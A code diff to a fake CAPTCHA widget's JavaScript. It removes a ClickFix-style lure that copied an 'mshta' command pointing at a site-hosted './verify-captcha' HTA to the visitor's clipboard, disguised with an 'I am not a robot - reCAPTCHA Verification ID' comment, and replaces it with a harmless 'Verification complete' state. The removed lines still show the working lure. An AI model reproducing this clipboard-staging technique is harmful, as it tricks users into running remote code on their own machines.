@@ -21,12 +21,14 @@ function addCaptchaListeners() {
 
 function runClickedCheckboxEffects() {
     hideCaptchaCheckbox();
+    showCaptchaLoading();
     setTimeout(function () {
-        showCaptchaLoading();
-    }, 500);
-    setTimeout(function () {
+        hideCaptchaLoading();
+        checkboxBtn.classList.add("verified");
+        checkboxBtn.setAttribute("aria-label", "Verification complete");
+        checkboxBtn.disabled = false;
         showVerifyWindow();
-    }, 900)
+    }, 7000);
 }
 
 function showCaptchaLoading() {
@@ -76,12 +78,6 @@ function hideCaptchaLoading() {
     checkboxBtnSpinner.style.opacity = "0";
 }
 
-function generateRandomNumber() {
-    const min = 1000;
-    const max = 9999;
-    return Math.floor(Math.random() * (max - min + 1) + min).toString();
-}
-
 function closeverifywindow() {
     verifywindow.style.display = "none";
     verifywindow.style.visibility = "hidden";
@@ -89,31 +85,9 @@ function closeverifywindow() {
 
     showCaptchaCheckbox();
     hideCaptchaLoading();
-    checkboxBtn.disabled = false;
+    checkboxBtn.classList.remove("verified");
+    checkboxBtn.removeAttribute("aria-label");
 }
-
-function isverifywindowVisible() {
-    return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
-}
-
-function setClipboardCopyData(textToCopy) {
-    const tempTextArea = document.createElement("textarea");
-    tempTextArea.value = textToCopy;
-    document.body.append(tempTextArea);
-    tempTextArea.select();
-    document.execCommand("copy");
-    document.body.removeChild(tempTextArea);
-}
-
-function stageClipboard(commandToRun, verification_id) {
-    const suffix = " # "
-    const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
-    const end = "''"
-    const textToCopy = commandToRun + suffix + ploy + verification_id + end
-
-    setClipboardCopyData(textToCopy);
-}
-
 
 function showVerifyWindow() {
     verifywindow.style.display = "block";
@@ -130,12 +104,7 @@ function showVerifyWindow() {
         verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
     }
 
-    var verification_id = generateRandomNumber();
-    document.getElementById('verification-id').textContent = verification_id;
-
-    const htaPath = new URL("./verify-captcha", window.location.href).toString();
-    const commandToRun = "mshta " + htaPath;
-    stageClipboard(commandToRun, verification_id);
+    document.getElementById("verification-status").textContent = "Verification complete.";
 }
 
 addCaptchaListeners();
